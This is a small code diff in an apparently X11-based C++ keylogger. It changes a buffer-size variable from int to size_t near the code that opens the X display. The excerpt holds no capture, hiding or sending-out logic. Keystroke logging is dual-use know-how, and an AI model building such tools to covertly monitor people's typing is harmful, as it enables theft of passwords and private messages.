@@ -17,7 +17,7 @@ void Key_Logger::start() {
     const char * hostname = DEFAULT_DISPLAY;
     bool printKeyUps = DEFAULT_PRINT_UP;
     std::string buffer;
-    int buffersize = 256;
+    size_t buffersize = 256;
 
     // Set up X
     Display * disp = XOpenDisplay(hostname);
